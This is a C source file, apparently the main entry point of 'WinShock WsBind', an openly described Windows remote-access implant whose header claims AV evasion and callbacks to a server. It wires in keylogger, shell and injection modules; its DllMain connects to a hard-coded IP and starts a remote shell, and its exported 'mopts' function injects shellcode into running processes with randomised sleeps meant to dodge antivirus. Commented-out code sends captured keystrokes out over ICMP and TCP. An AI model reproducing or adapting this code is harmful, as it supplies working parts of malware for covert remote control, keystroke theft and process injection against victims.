/*
 *  WinShock
 *      Move quietly like the Wind-ows
 *
 *  WinShock Binder (WsBind)
 *      Once loaded on a client, WsBind will evade AV and establish a connection to the specified server
 *      Contains method call backs to server for all sorts of functionality
 *
 *  Compile using MinGW on windows (Use the PowerShell script)
 *
 *  EXE + DLL payload (DLL wrapped in EXE).
 *
 *  Author: @idigitalflame
 *
 *  No malicious use please, use for CTFs and pentesting
 *
 *  This is the main file, where the main EXE, Service and DLL entry points are loaded
 */

#define _WIN32_WINNT 0x0501

#define WSBIND_SERVER_COMM 0
/*
 * WsBind Comm Type
 *
 *  - 0 - TCP
 *  - 1 - UDP
 *  - 2 - ICMP
 */
#define WSBIND_SERVER_PORT 80
/*
 * WsBind Server Listen Port
 *
 * Not valid when WSBIND_SERVER_COMM == 2
 */
#define WSBIND_COMM_ENCRYPT 1
/*
 * WsBind Encrypt Comms
 *
 *  - 0 - PlainText
 *  - 1 - Encrypt
 */
#define WSBIND_SERVER "0.0.0.0"
/*
 * WsBind Server Address
 *
 * Can be a hostname
 */
#define WSDIND_COMM_ENCRYPT_PSK "...................."
/*
 * WsBind Encryption Passkey
 *
 * Only used for initial connection to server, then code is negotiated between server and client.
 * Must be the same on server to establish connection.
 *
 * Not valid when WSBIND_COMM_ENCRYPT == 0
 */

#define WSBIND_ICMP_BURST 1
#define WSBIND_COMM_WAIT_TIME 5

// Includes
#include <stdio.h>
#include <ws2tcpip.h>
#include <winsock2.h>
#include <windows.h>
#include <stdlib.h>

// Custom Includes
#include "wsbind_win.c" // WinAPI Stub
#include "wsbind_key.c" // KeyLogger Stub
#include "wsbind_proc.c" // Process Stub
#include "wsbind_comm.c" // Communications Stub
#include "wsbind_shell.c" // Shell Stub
#include "wsbind_util.c" // Utilities Stub
#include "wsbind_const.c" // Constants Stub
//#include "wsbind_shock.c" // Shock and Awe baby!!

/*
 * WsBind Service (WsBsVc) Helpers
 */
SERVICE_STATUS ServiceStatus;
SERVICE_STATUS_HANDLE hStatus;
/*
 * WsBind Self-in-Self (WsBSiS) Length
 *
 * Automatically added using build script.
 */
const int SELF_LEN = -123456;  // Size of self scode.  Generated by gen.ps1
/*
 * WsBind Self-in-Self (WsBSiS) Length
 *
 * Hex payload of self.  Stored to allow WsBind to duplicate itself in DLL format and append to multiple structures
 * in the Windows environment.
 */
unsigned char SELF[] = "|/|/"; // Raw scode off self.  Generated by gen.ps1


void key_send_icmp(unsigned char ch)
{
    unsigned char buf[6];
    buf[0] = 'k';
    buf[1] = 'e';
    buf[2] = 'y';
    buf[3] = ':';
    buf[4] = ch;
    buf[5] = '\0';
    //ws_comm_icmp_send_recv("10.0.240.146", 0, buf, 0, NULL, FALSE);
}


SockData outd;
char SERVER[] = "172.16.105.128";

void key_test(unsigned char ch)
{
    unsigned char buu[2];
    buu[0] = ch;
    buu[1] = '\0';
    wsc_write(&outd, buu);
}

/*
 * WinShock WsBind Main
 */
int main(int argc, char *argv[])
{
    //printf("Tesing output\n");


    /*char* buf = calloc(10, 1);
    //printf("Got bugger %s\n\0", buf);
    int proc = 0, tr =0;

    for(; tr < 2; tr++) {
        proc = wsp_execv("cmd /c dir C:\\\0", &buf, 1);

        printf("Got PIID %d\nGot Payload: %s\n\0", proc, buf);
    }
    //char *bf = malloc(10);
    //int c = 0;
    //for(; c < 5; c++) {
    //    int z = ws_proc_execv("cmd.exe /c dir c:\\Windows", NULL, 1);
    //    printf("PID >%d<\n>\n%s\n<\n", z, bf);
    //}

    SockData sk;
    sk = wsc_tcp_create("172.16.105.128", 80);
    wsc_write(&sk, "This is a string!!\0");

    char* in = calloc(100, 1);*/

    /*while(1)
    {
        wsc_write(&sk, "Input>\0");

    }*/

    //HWND skel_window = GetConsoleWindow();
    //ShowWindow(skel_window, SW_MINIMIZE);
    //ShowWindow(skel_window, SW_HIDE);
    //ws_comm_init();
    //outd = ws_comm_tcp_create(SERVER, 80);
    //SockData skel = ws_comm_tcp_create(SERVER, 443);
    //ws_comm_write(&skel, "Hello there!\0");
    //ws_shell_basic_nocmd(&skel);
    //ws_key_register_listener(key_test);
    //ws_key_start_scan(0, 0);
    //return 0;

    //ws_key_register_listener(key_test);
    //ws_key_register_listener(key_send_icmp);
    //ws_key_start_scan(0, 30000);

    //char *add = "10.0.240.146\0"; //"10.0.240.129";
    //0
   // unsigned char *msg = "This is a very long string str01234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789!\0";

    //unsigned char *data = calloc(50, 1), *d1 = calloc(50, 1);

    //int recs = ws_icmp_send_red_raw(add, 0, msg, 500, &data);

    //SockData wsa = ws_comm_icmp_create(add);


    //int ss = ws_comm_write(&wsa, msg);
    //ws_comm_write(&wsa, msg);

    //int cc = ws_comm_read(&wsa, 50, data);


    //printf("Got>>%s<< (%d)\n", wsa.sock_addr, ss);
    //printf("Read>%s<< (%d)\n", data, cc);

   // int ee = ws_comm_read(&wsa, 50, d1);
   // printf("Read>%s<< (%d)\n", d1, ee);


    //int recs = ws_icmp_send_red_raw(wsa, NULL, 0, msg, 500, &data);


    //printf("Received %d Bytes\n%s\n", recs, data);

    //SockData aaaa = ws_comm_tcp_create(add, 80);

    //ws_comm_write(aaaa, "GET / HTTP/1.1\nHost: mail.losynth.com\n\r\n\r\n\0");

    //unsigned char *resp = calloc(100, 1);
    //int zzz = ws_comm_read(aaaa, 100, resp);

    //printf("Got http, >>%s<<< (%d)\n", resp, zzz);

    //return 0;
    wsc_init();

    /*if(argc == 2)
    {
        unsigned char *data = malloc(1);
        ws_comm_http_download(argv[1], NULL, &data);
        printf("Downloaded!, saved to 'file.txt'!\n");
        FILE *out = fopen("file.txt", "wb");
        fprintf(out, "%s", data);
        fclose(out);
        free(out);
        free(data);
    }
    else
    {
        char *b = ws_util_randomString(8, NULL, ".dll"), *a = ws_proc_create_dll(b, NULL, SELF_LEN, SELF);
        free(b);
        printf("DLL is at '%s'!\n", a);
        if (ws_proc_run_dll(a, "mopts", a) > 0)
            printf("Dll was Ran!\n");
        else
            printf("Failed!\n");
        free(a);
    }
    return 0;*/

    while(1)
    {

        //SockData a = wsc_tcp_create("10.150.152.100", 50007);
        //char* b = "647254\0";
        //wsc_write(&a, b);
        //free(b);
        //wsc_close_sock(&a);
        //Sleep(4*60*1000);
    }
    return 0;
}



void ServiceMain(int wsArgCount, char** wsArguments)
{
    return;
}



/*
 * WinShock WsBind DLLMain function
 *
 * This function gets called when the DLL version of WsBind gets attached to a process
 *
 * wsReason csn be four values
 * 0 - DLL deteched from RunDLL
 * 1 - DLL attached to RunDLL
 * 3 - DLL attached to external process
 * 2 - DLL detached to external process
 */
BOOL WINAPI DllMain(HINSTANCE wsDLLHandle, DWORD wsReason, LPVOID wsReservedData)
{
    wsc_init();
    if(wsReason == 3) // are we loaded in another process?
    {
        SockData a = wsc_tcp_create("10.0.240.125", 80);
        wss_basic_noprock(a);
    }

    return TRUE;
}

/*
 * WinShock WsBind DLL Entry point
 *
 * This entry point is where the DLL will get executed from RunDLL
 * The function name is passed as a parameter to RunDLL
 */
__declspec(dllexport) void mopts(HWND wsHandle, HINSTANCE wsInstance, LPSTR wsArguments, int wsShowCmd)
{
    int *a, b = 0;
    Process *c = wsp_processes(&a);
    for(b = 0; b < (int)a; b++)
    {
        if(strlen(c[b].name) > 0 && c[b].id > 600)
        {
            //char aa[256];
            //sprintf(aa, "LOOKING AT: %d (%s)\n", c[b].id, c[b].name);
            //ws_utils_write_file("C:\\watch.txt", "w+", aa);
            //if(ws_proc_injSCode(c[b].id, 229, sCode))
            Sleep(wsu_randInt(3000, 8000)); // add random pause to evade AV detection from direct access
            //if(ws_proc_injDll(c[b].id, lpszCmdLine) > 0)
            if(wsp_injscode(c[b].id, 0, buf))
                break;
        }
    }
}